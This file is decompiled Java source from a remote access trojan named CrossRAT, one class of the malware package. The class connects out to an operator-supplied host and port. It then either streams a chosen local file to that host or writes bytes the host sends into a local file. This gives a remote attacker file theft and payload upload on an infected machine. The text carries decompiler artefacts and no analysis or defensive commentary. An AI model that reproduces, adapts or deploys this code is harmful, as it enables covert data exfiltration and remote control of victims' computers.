package crossrat;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.net.Socket;

/* loaded from: hmar6.jar:crossrat/d.class */
public final class d extends Thread {

    /* renamed from: a */
    private Socket f33a;

    /* renamed from: b */
    private String f34b;
    private int c;
    private String d;
    private String e;
    private String f;
    private String g;

    public d(String str, int i, String str2, String str3, String str4, String str5) {
        this.f34b = str;
        this.c = i;
        this.f = str4;
        this.e = str3;
        this.d = str2;
        this.g = str5;
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v11 */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.lang.Exception] */
    private void a(String str, String str2, String str3) {
        DataOutputStream dataOutputStream = new DataOutputStream(this.f33a.getOutputStream());
        FileInputStream fileInputStream = new FileInputStream(str);
        ?? r0 = dataOutputStream;
        r0.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.file_write_status + k.arg_delimit + str2 + k.arg_delimit + str3 + k.arg_delimit + "&&&");
        try {
            r0 = 2000;
            Thread.sleep(2000L);
        } catch (Exception e) {
            r0.printStackTrace();
        }
        byte[] bArr = new byte[2048];
        while (fileInputStream.read(bArr) > 0) {
            dataOutputStream.write(bArr);
        }
        fileInputStream.close();
        dataOutputStream.close();
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r0v15 */
    /* JADX WARN: Type inference failed for: r0v2, types: [java.io.DataOutputStream] */
    /* JADX WARN: Type inference failed for: r0v3, types: [java.lang.Exception] */
    private void b(String str, String str2, String str3) {
        DataInputStream dataInputStream = new DataInputStream(this.f33a.getInputStream());
        FileOutputStream fileOutputStream = new FileOutputStream(str);
        ?? dataOutputStream = new DataOutputStream(this.f33a.getOutputStream());
        dataOutputStream.writeBytes(String.valueOf(k.g) + k.arg_delimit + k.file_read_status_and_contents + k.arg_delimit + str2 + k.arg_delimit + str3 + k.arg_delimit + "&&&");
        try {
            dataOutputStream = 2000;
            Thread.sleep(2000L);
        } catch (Exception e) {
            dataOutputStream.printStackTrace();
        }
        byte[] bArr = new byte[2048];
        int parseInt = Integer.parseInt(str3);
        while (true) {
            int read = dataInputStream.read(bArr, 0, Math.min(2048, parseInt));
            if (read <= 0) {
                fileOutputStream.close();
                dataInputStream.close();
                return;
            }
            parseInt -= read;
            fileOutputStream.write(bArr, 0, read);
        }
    }

    /* JADX WARN: Multi-variable type inference failed */
    @Override // java.lang.Thread, java.lang.Runnable
    public final void run() {
        try {
            this.f33a = new Socket(this.f34b, this.c);
            if (this.g == "0") {
                a(this.d, this.e, this.f);
            }
            if (this.g != "1") {
                return;
            }
            b(this.d, this.e, this.f);
        } catch (Exception e) {
            printStackTrace();
        }
    }
}
